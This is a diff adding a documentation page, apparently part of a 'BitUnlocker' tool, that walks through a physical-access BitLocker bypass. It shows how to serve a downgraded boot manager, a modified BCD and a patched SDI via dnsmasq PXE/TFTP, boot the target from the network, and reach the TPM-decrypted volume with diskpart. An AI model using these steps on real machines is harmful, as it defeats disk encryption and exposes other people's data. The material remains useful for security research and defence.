@@ -1,0 +1,83 @@
+---
+title: "PXE Boot: Deliver the BitUnlocker Attack over the Network"
+sidebarTitle: "PXE Boot"
+description: "Set up a dnsmasq PXE server on Linux to serve boot_patched.sdi to the target over Ethernet, then trigger a network boot from WinRE or the UEFI menu."
+---
+
+The PXE delivery method uses a Linux machine connected to the target via Ethernet to serve the pre-patch `bootmgfw.efi` and `boot_patched.sdi` over TFTP. This approach takes several minutes for the SDI file to transfer, but it is valuable when USB ports are physically locked or disabled in firmware. The repository's `TFTP-root/` directory already contains the pre-patch `bootmgfw.efi` in the correct layout — you only need to add the modified BCD and `boot_patched.sdi`, then start `dnsmasq`.
+
+## TFTP-root Layout
+
+After completing the [Prepare SDI](/walkthrough/prepare-sdi) and [Modify BCD](/walkthrough/modify-bcd) steps, your `TFTP-root/` directory should look like this:
+
+```text
+TFTP-root/
+├── bootmgfw.efi                # Pre-patch boot manager (PCA 2011)
+├── Boot/
+│   └── BCD                     # Your modified BCD
+├── EFI/
+│   └── Microsoft/
+│       └── Boot/
+│           └── bootmgfw.efi    # Same pre-patch boot manager
+└── sdi/
+    └── boot_patched.sdi        # Patched SDI with custom WinRE
+```
+
+The repository already provides `bootmgfw.efi` in the appropriate locations within `TFTP-root/`. Place the BCD file you produced in [Modify BCD](/walkthrough/modify-bcd) at `TFTP-root/Boot/BCD`, and place `boot_patched.sdi` at `TFTP-root/sdi/boot_patched.sdi`.
+
+## Start the PXE Server
+
+Connect the target machine to your Linux machine using an Ethernet cable, then run the following commands to assign a static IP to the interface and start `dnsmasq` as a combined DHCP and TFTP server:
+
+```bash
+cd BitUnlocker
+export INTERFACE=<your-interface>
+export ABS_TFTP_ROOT=$(pwd)/TFTP-root
+
+sudo ifconfig $INTERFACE 10.13.37.1
+sudo dnsmasq --no-daemon \
+  --interface="$INTERFACE" \
+  --dhcp-range=10.13.37.100,10.13.37.101,255.255.255.0,1h \
+  --dhcp-boot=bootmgfw.efi \
+  --enable-tftp \
+  --tftp-root="$ABS_TFTP_ROOT" \
+  --log-dhcp \
+  --tftp-max=65464 \
+  --port=0
+```
+
+Replace `<your-interface>` with the name of your Ethernet interface (e.g. `eth0`, `enp3s0`). Run `ip link` to list available interfaces if you are unsure.
+
+<Tip>
+  The `--port=0` flag disables `dnsmasq`'s DNS server function so it does not conflict with a DNS daemon that may already be running on port 53. This flag is already included in the command above.
+</Tip>
+
+## Trigger PXE Boot on the Target
+
+Boot the target into network boot mode using one of these methods:
+
+- **From WinRE:** In the recovery menu, choose **Use a device → IPv4 Network**.
+- **At power-on:** Press the manufacturer's PXE boot key as the machine starts (commonly **F12** or a dedicated network boot option in the UEFI boot menu).
+
+## Wait for the SDI Transfer
+
+Once the target boots, the pre-patch `bootmgfw.efi` is delivered via TFTP, after which the boot manager reads the BCD and begins downloading `boot_patched.sdi`. Because the file is approximately 300 MB, the transfer over a direct Ethernet link typically takes several minutes. A recovery-related message showing the SDI path will appear on the target's screen while the download is in progress.
+
+<Warning>
+  TFTP is case-sensitive. If the target requests a file such as `Bootmgfw.efi` (capital B) and the file on disk is named `bootmgfw.efi`, the transfer will fail with a "file not found" error. Check the `dnsmasq` log output on your Linux machine to see exactly what the target is requesting, and rename files to match. Font files requested by the boot manager and not found can be safely ignored — they are non-critical.
+</Warning>
+
+## Access the Decrypted Volume
+
+Once the SDI finishes loading, a command prompt appears on the target. The TPM will have already unsealed the BitLocker volume master key, so the OS volume is decrypted and should be mounted automatically — typically as `C:` or `E:`.
+
+If the volume is not mounted automatically, use `diskpart` to assign it a letter:
+
+```bat
+diskpart
+sel vol X
+assign letter=C
+exit
+```
+
+Replace `X` with the volume number that corresponds to the encrypted OS partition (identified by its size in the `diskpart` listing).
